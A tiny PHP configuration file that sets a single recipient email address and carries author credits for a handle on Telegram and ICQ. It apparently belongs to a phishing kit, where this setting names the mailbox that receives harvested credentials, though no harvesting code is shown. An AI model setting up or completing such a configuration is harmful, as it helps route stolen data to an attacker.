<?php

// One Email
$TO = "m1000w@protonmail.com";


// Enjoy made with love by @x0rzed
// telegram @x0rzed
// icq @x0rzed2